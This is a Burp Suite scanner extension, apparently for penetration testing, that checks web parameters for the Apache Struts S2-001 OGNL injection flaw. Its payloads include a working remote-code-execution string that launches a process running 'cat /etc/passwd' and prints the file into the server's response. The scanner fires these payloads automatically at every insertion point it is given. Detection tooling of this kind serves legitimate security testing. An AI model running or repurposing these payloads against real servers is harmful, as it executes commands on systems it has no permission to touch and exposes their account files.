from burp import IBurpExtender
from burp import IScannerCheck
from burp import IScanIssue
from array import array

payload0 = '''%{1337*1337}'''
payload1 = '''%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
'''
payload2 = '''%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
'''
payloads = [(payload0,'1787569' ),(payload1,'tomcat'),(payload2,'root:x:')]


class BurpExtender(IBurpExtender, IScannerCheck):

    #
    # implement IBurpExtender
    #

    def registerExtenderCallbacks(self, callbacks):
        # keep a reference to our callbacks object
        self._callbacks = callbacks

        # obtain an extension helpers object
        self._helpers = callbacks.getHelpers()

        # set our extension name
        callbacks.setExtensionName("Apache Struts s2-001 reflect rce")

        # register ourselves as a custom scanner check
        callbacks.registerScannerCheck(self)

    # helper method to search a response for occurrences of a literal match string
    # and return a list of start/end offsets

    def _get_matches(self, response, match):
        matches = []
        start = 0
        reslen = len(response)
        matchlen = len(match)
        while start < reslen:
            start = self._helpers.indexOf(response, match, True, start, reslen)
            if start == -1:
                break
            matches.append(array('i', [start, start + matchlen]))
            start += matchlen

        return matches

    #
    # implement IScannerCheck
    #

    def doPassiveScan(self, baseRequestResponse):
        return None

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        all_issues = []
        for p,po in payloads:

            payload = bytearray(p)
            plout = bytearray(po)
            # make a request containing our injection test in the insertion point
            checkRequest = insertionPoint.buildRequest(payload)
            checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest)

            # look for matches of our active check grep string
            matches = self._get_matches(checkRequestResponse.getResponse(), plout)
            if len(matches) == 0:
                continue
            else:
                # get the offsets of the payload within the request, for in-UI highlighting
                requestHighlights = [insertionPoint.getPayloadOffsets(payload)]

        # report the issue
            new_issue = CustomScanIssue(
                baseRequestResponse.getHttpService(),
                self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                [self._callbacks.applyMarkers(checkRequestResponse, requestHighlights, matches)],
                "Apache struts2 OGNL Injection (Reflected)",
                "Reflect expression: " + plout,
                "High")

            all_issues.append(new_issue)

        if not all_issues:
            return None
        else:
            return all_issues


    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        # This method is called when multiple issues are reported for the same URL 
        # path by the same extension-provided check. The value we return from this 
        # method determines how/whether Burp consolidates the multiple issues
        # to prevent duplication
        #
        # Since the issue name is sufficient to identify our issues as different,
        # if both issues have the same name, only report the existing issue
        # otherwise report both issues
        if existingIssue.getIssueName() == newIssue.getIssueName():
            return -1

        return 0

#
# class implementing IScanIssue to hold our custom scan issue details
#
class CustomScanIssue (IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        pass

    def getRemediationBackground(self):
        pass

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        pass

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
